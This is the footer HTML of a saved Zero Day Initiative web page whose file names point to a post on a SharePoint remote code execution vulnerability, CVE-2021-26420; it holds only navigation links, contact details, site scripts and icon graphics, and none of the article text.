                <a rel="me" href="https://infosec.exchange/@thezdi">Mastodon</a>
            </div>
            <div class="footerContactBox">
                <h3>Media Inquiries</h3>
                <a href="mailto:media_relations@trendmicro.com">media_relations@trendmicro.com</a>
            </div>
            <div class="footerContactBox">
                <h3>Sensitive Email Communications</h3>
                <a href="https://www.zerodayinitiative.com/documents/zdi-pgp-key.asc" target="_blank">PGP Key</a>
            </div>
        </div>
    </div>

    <div id="footerMenu">
        <div id="footerMiddleSection" class="group">
            <div id="footerLinks">
                <div class="content">
                    <div class="footerLinkBox">
                        <a href="https://www.zerodayinitiative.com/about/" class="footerTitleLink">WHO WE ARE</a>
                        <ul>
                            <li><a href="https://www.zerodayinitiative.com/about/">Our Mission</a></li>

                            <li><a href="https://www.trendmicro.com/">Trend Micro</a></li>
                            <li>
                                <a href="https://www.trendmicro.com/en_us/business/products/network/integrated-atp/next-gen-intrusion-prevention-system.html">TippingPoint
                                    IPS</a></li>
                        </ul>
                    </div>
                    <div class="footerLinkBox">
                        <a href="https://www.zerodayinitiative.com/about/benefits/" class="footerTitleLink">HOW IT WORKS</a>
                        <ul>
                            <li><a href="https://www.zerodayinitiative.com/about/benefits/#process">Process</a></li>
                            <li><a href="https://www.zerodayinitiative.com/about/benefits/#researcher-rewards">Researcher Rewards</a></li>
                            <li><a href="https://www.zerodayinitiative.com/about/faq/">FAQS</a></li>
                            <li><a href="https://www.trendmicro.com/privacy/">Privacy</a></li>
                        </ul>
                    </div>
                    <div class="footerLinkBox">
                        <a href="https://www.zerodayinitiative.com/advisories" class="footerTitleLink">ADVISORIES</a>
                        <ul>
                            <li><a href="https://www.zerodayinitiative.com/advisories/published">Published Advisories</a></li>
                            <li><a href="https://www.zerodayinitiative.com/advisories/upcoming">Upcoming Advisories</a></li>
                            <li><a href="https://www.zerodayinitiative.com/rss">RSS Feeds</a></li>
                        </ul>
                    </div>
                    <div class="footerLinkBox">
                        <a href="https://www.zerodayinitiative.com/blog" class="footerTitleLink">BLOG</a>
                    </div>

                    <div class="footerLogo">
                        <a href="https://www.zerodayinitiative.com/"><img src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/logo-scarab.svg" alt="thezdi"></a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<script>var baseURL = ""</script>
<script src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/main.js.download"></script>

<script data-sqs-type="imageloader-bootstrapper">if(window.ImageLoader) window.ImageLoader.bootstrap({}, document);</script><script>Squarespace.afterBodyLoad(Y);</script><svg xmlns="http://www.w3.org/2000/svg" version="1.1" style="display:none" data-usage="social-icons-svg"><symbol id="youtube-icon" viewBox="0 0 64 64"><path d="M46.7,26c0,0-0.3-2.1-1.2-3c-1.1-1.2-2.4-1.2-3-1.3C38.3,21.4,32,21.4,32,21.4h0 c0,0-6.3,0-10.5,0.3c-0.6,0.1-1.9,0.1-3,1.3c-0.9,0.9-1.2,3-1.2,3S17,28.4,17,30.9v2.3c0,2.4,0.3,4.9,0.3,4.9s0.3,2.1,1.2,3 c1.1,1.2,2.6,1.2,3.3,1.3c2.4,0.2,10.2,0.3,10.2,0.3s6.3,0,10.5-0.3c0.6-0.1,1.9-0.1,3-1.3c0.9-0.9,1.2-3,1.2-3s0.3-2.4,0.3-4.9 v-2.3C47,28.4,46.7,26,46.7,26z M28.9,35.9l0-8.4l8.1,4.2L28.9,35.9z"></path></symbol><symbol id="youtube-mask" viewBox="0 0 64 64"><path d="M0,0v64h64V0H0z M47,33.1c0,2.4-0.3,4.9-0.3,4.9s-0.3,2.1-1.2,3c-1.1,1.2-2.4,1.2-3,1.3 C38.3,42.5,32,42.6,32,42.6s-7.8-0.1-10.2-0.3c-0.7-0.1-2.2-0.1-3.3-1.3c-0.9-0.9-1.2-3-1.2-3S17,35.6,17,33.1v-2.3 c0-2.4,0.3-4.9,0.3-4.9s0.3-2.1,1.2-3c1.1-1.2,2.4-1.2,3-1.3c4.2-0.3,10.5-0.3,10.5-0.3h0c0,0,6.3,0,10.5,0.3c0.6,0.1,1.9,0.1,3,1.3 c0.9,0.9,1.2,3,1.2,3s0.3,2.4,0.3,4.9V33.1z M28.9,35.9l8.1-4.2l-8.1-4.2L28.9,35.9z"></path></symbol></svg>



</body></html>